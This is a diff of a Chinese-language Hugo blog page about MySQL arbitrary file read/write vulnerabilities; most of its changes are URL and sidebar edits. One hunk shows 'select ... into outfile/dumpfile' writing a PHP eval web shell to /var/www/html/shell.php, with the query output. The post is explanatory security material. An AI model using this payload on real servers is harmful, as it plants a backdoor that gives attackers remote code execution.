@@ -19,7 +19,7 @@
 
 <meta name="generator" content="Hugo 0.76.3" />
 
-<link rel="canonical" href="https://geekzzy.github.io/post/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/" />
+<link rel="canonical" href="/post/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/" />
 
 
 <meta property="og:title" content="任意读写漏洞" />
@@ -28,15 +28,15 @@
 诗书事业，青毡犹在，头上貂蝉会见。
 莫贪风月卧江湖，道日近、长安路远。" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://geekzzy.github.io/post/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/" />
-<meta property="og:image" content="https://geekzzy.github.io/img/1.jpg" />
+<meta property="og:url" content="/post/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/" />
+<meta property="og:image" content="/img/1.jpg" />
 <meta property="article:published_time" content="2019-08-13T09:39:50+00:00" />
 <meta property="article:modified_time" content="2019-08-13T09:39:50+00:00" />
 
 
 
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://geekzzy.github.io/img/1.jpg"/>
+<meta name="twitter:image" content="/img/1.jpg"/>
 
 <meta name="twitter:title" content="任意读写漏洞"/>
 <meta name="twitter:description" content="小窗风雨，从今便忆，中夜笑谈清软。
@@ -74,7 +74,7 @@
       background-color: #ccc;
     
     
-      background-image: url(/me/background-dark.jpg);
+      background-image: url(/me/background.jpg);
     
   }
 </style>
@@ -97,7 +97,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/geekzzy.github.io\/'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = ''"></i>
   </div>
   <div class="item">
     <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
@@ -168,13 +168,13 @@
 <blockquote>
 <p>写入文件的要求很高，不仅需要在secure_file_priv指定路径下且为绝对路径，还需要吸入文件目录具有777权限</p>
 </blockquote>
-<p><code>&lt;sql&gt; into outfile &lt;path_file&gt;</code>:写入文件</p>
+<p><code>select [write_shell] into outfile [path_file]</code>:写入文件</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    mysql<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;&lt;?php eval($_POST[&#39;</span>shell<span style="color:#e6db74">&#39;])?&gt;&#39;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>;
     Query OK, <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> affected (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
     
     [root<span style="color:#f92672">@</span>zzy <span style="color:#f92672">/</span>]cat shell.php
     <span style="color:#f92672">&lt;?</span>php eval(<span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;shell&#39;</span>])<span style="color:#f92672">?&gt;</span>
-</code></pre></div><p><code>&lt;sql&gt; into dumpfile &lt;path_file&gt;</code>:写入文件(二进制)，几乎同上</p>
+</code></pre></div><p><code>select [write_shell] into dumpfile &lt;path_file&gt;</code>:写入文件(二进制)，几乎同上</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    mysql<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;&lt;?php eval($_POST[&#39;</span>shell<span style="color:#e6db74">&#39;])?&gt;&#39;</span> <span style="color:#66d9ef">into</span> dumpfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>;
 </code></pre></div><h2 id="0x02-读">0x02 读</h2>
 <hr>
@@ -234,7 +234,7 @@
 
 
           var disqus_config = function () {
-            this.page.url = 'https:\/\/geekzzy.github.io\/post\/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E\/';  
+            this.page.url = '\/post\/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E\/';  
             this.page.identifier = '\/post\/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E\/'; 
           };
 
@@ -295,6 +295,8 @@
       <a class="ui label" href="/tags/cyber-security" title="cyber-security">cyber-security</a>
     
       <a class="ui label" href="/tags/english" title="english">english</a>
+    
+      <a class="ui label" href="/tags/git" title="git">git</a>
     
       <a class="ui label" href="/tags/linux" title="linux">linux</a>
     
@@ -400,6 +402,26 @@
         
           <div class="title">
             <i class="dropdown icon"></i>
+            <a href="/categories/git" class="item">git</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/git/" class="item">Git</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
             <a href="/categories/linux" class="item">linux</a>
           </div>
           <div class="content">
@@ -481,22 +503,6 @@
       
         
 
-        
-          <div class="title">
-            <i class="dropdown icon"></i>
-            <a href="/categories/php" class="item">php</a>
-          </div>
-          <div class="content">
-            <div class="ui list">
-            
-              <div class="item">
-                <div class="content">
-                  <a href="/post/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="item">伪协议与文件包含</a>
-                </div>
-              </div>
-            
-            </div>
-          </div>
         
       
         
@@ -675,6 +681,35 @@ code.has-jax {
       </article>
     </section>
   
+    <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+      <article>
+        <div class="ui top attached segment">
+          <h3 class="ui header">其他</h3>
+        </div>
+        <div class="ui bottom attached segment markdown-body">
+          <p>如果你喜欢我的开源项目或者它们可以给你带来帮助，可以赏一杯咖啡 ☕ 给我。~</p>
+<p>If you like my open source projects or they can help you. You can <a href="/posts/buy-me-a-coffee">buy me a coffee ☕</a>.~</p>
+<blockquote>
+<p>PayPal</p>
+</blockquote>
+<p><a href="https://paypal.me/g1eny0ung">https://paypal.me/g1eny0ung</a></p>
+<blockquote>
+<p>Patreon</p>
+</blockquote>
+<p><a href="https://www.patreon.com/bePatron?u=42327574" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script></p>
+<blockquote>
+<p>微信赞赏码</p>
+</blockquote>
+<p><img class="ui image" src="/me/微信赞赏码.jpeg" alt="wechat" /></p>
+<blockquote>
+<p>最好附加一下信息或者留言，方便我可以<a href="/posts/buy-me-a-coffee">将捐助记录 📝 下来</a>，十分感谢 🙏。</p>
+<p>It is better to attach some information or leave a message so that I can <a href="/posts/buy-me-a-coffee">record the donation 📝</a>, thank you very much 🙏.</p>
+</blockquote>
+
+        </div>
+      </article>
+    </section>
+  
 
   <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
     <article>
@@ -773,7 +808,7 @@ code.has-jax {
 
 
             var disqus_config = function () {
-              this.page.url = 'https:\/\/geekzzy.github.io\/post\/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E\/';  
+              this.page.url = '\/post\/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E\/';  
               this.page.identifier = '/'; 
             };
 
@@ -847,7 +882,7 @@ code.has-jax {
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/geekzzy.github.io\//index.json', function (data) {
+    $.getJSON('/index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
